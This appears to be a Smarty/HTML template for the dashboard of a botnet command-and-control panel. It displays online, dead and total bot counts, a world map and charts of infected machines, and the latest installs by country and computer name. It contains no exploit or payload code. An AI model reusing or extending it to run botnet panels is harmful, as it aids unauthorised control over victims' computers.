
{include file="header.tpl"}
{include file="nav.tpl"}

<!--
it's going to be hard but hard doesn't mean impossible
-->

<div class="col-md-12 col-lg-11">
  <div class="container">
    <div class="row">
          <div class="col-md-12 col-lg-5">
              <div id="vmap" style=""></div>
          </div>
          <div class="col-md-12 col-lg-7">
              <div class="row">
                  <div class="col-md-6 col-lg-6"><div class="card-stats card">
                          <div class="card-body">
                              <div class="row"><div class="col-4"><div class="info-icon text-center icon-warning"><img width="80" src="{$includeDir}assets/img/workingguy.svg"></div></div>
                                  <div class="col-8"><div class="numbers"><p class="card-category">Online Bots</p><h3 class="card-title">{$onlinebotcount}</h3></div></div>
                              </div>
                          </div>
                          <!--     <div class="card-footer"><hr><div class="stats"><i class="tim-icons icon-refresh-01"></i> Update Now</div></div> -->
                      </div>
                  </div>
                  <div class="col-md-6 col-lg-6"><div class="card-stats card">
                          <div class="card-body">
                              <div class="row"><div class="col-4"><div class="info-icon text-center icon-warning"><img width="80" src="{$includeDir}assets/img/world.svg"></div></div>
                                  <div class="col-8"><div class="numbers"><p class="card-category">Global Bots</p><h3 class="card-title">{$botcount}</h3></div></div>
                              </div>
                          </div>
                          <!--     <div class="card-footer"><hr><div class="stats"><i class="tim-icons icon-refresh-01"></i> Update Now</div></div> -->
                      </div>
                  </div>
                  <div class="col-md-6 col-lg-6"><div class="card-stats card">
                          <div class="card-body">
                              <div class="row"><div class="col-4"><div class="info-icon text-center icon-warning"><img width="80" src="{$includeDir}assets/img/rip.svg"></div></div>
                                  <div class="col-8"><div class="numbers"><p class="card-category">Dead Bots</p><h3 class="card-title">{$deadbotcount}</h3></div></div>
                              </div>
                          </div>
                          <!--     <div class="card-footer"><hr><div class="stats"><i class="tim-icons icon-refresh-01"></i> Update Now</div></div> -->
                      </div>
                  </div>
                  <div class="col-md-6 col-lg-6"><div class="card-stats card">
                          <div class="card-body">
                              <div class="row"><div class="col-4"><div class="info-icon text-center icon-warning"><img width="80" src="{$includeDir}assets/img/calendar.svg"></div></div>
                                  <div class="col-8">
                                      <div class="numbers special">
                                          <div class="row">
                                              <div class="col-12">
                                                  <p class="card-category"> Bots seen in last</p>
                                              </div>
                                          </div>
                                          <div class="row">
                                              <div class="col-8">
                                                  <p class="card-category">12 Hours</p>
                                              </div>
                                              <div class="col-4">
                                                  <h3 class="card-title">{$last12hclientscount}</h3>
                                              </div>
                                          </div>
                                          <div class="row">
                                              <div class="col-8">
                                                  <p class="card-category">24 Hours</p>
                                              </div>
                                              <div class="col-4">
                                                  <h3 class="card-title">{$lastclientscount}</h3>
                                              </div>
                                          </div>
                                          <div class="row">
                                              <div class="col-8">
                                                  <p class="card-category">7 Days</p>
                                              </div>
                                              <div class="col-4">
                                                  <h3 class="card-title">{$last7clientscount}</h3>
                                              </div>
                                          </div>
                                      </div>
                                  </div>
                              </div>
                          </div>
                          <!--     <div class="card-footer"><hr><div class="stats"><i class="tim-icons icon-refresh-01"></i> Update Now</div></div> -->
                      </div>
                  </div>
              </div>
          </div>
      </div>

      <div class="row">
          <div class="col-md-6">
              <div class="latestInstalls">
                  {foreach from=$last5Installs item=install}
                      <div class="install">
                            <div class="country">
                                <img src="{$includeDir}assets/img/flags/{$install.country|lower}.png"> <span>{$install.country}</span>
                            </div>
                            <div class="computername">
                                {$install.computrername}
                            </div>
                            <div class="installdate">
                                <span id="lastSeen-{$install.id}"></span> <script>$("#lastSeen-{$install.id}").html( timeDifference("{$install.now}","{$install.install_date}")) </script>
                            </div>
                      </div>
                  {/foreach}
              </div>
          </div>
          <div class="col-md-6">
              <canvas id="osPiChart" width="200" height="150"></canvas>
              <canvas id="adminornotchart" width="200" height="150"></canvas>
              <canvas id="architectureStatus" width="200" height="150"></canvas>
          </div>

      </div>

  </div>
</div>


{include file="footer.tpl"}


<script>
$(document).ready(function(){
    generateWordMap({$worldmap});
    generateLineChart("adminornotchart",{$adminOrNotLables},{$adminOrNotValues});
    generateLineChart("architectureStatus",{$architectureLables},{$architectureValue});
    //generateOsPiChart("countryStatus",{$countyLables},{$countyValue});
    generateLineChart("osPiChart",{$top3osLables},{$top3osvalues});
});
</script>
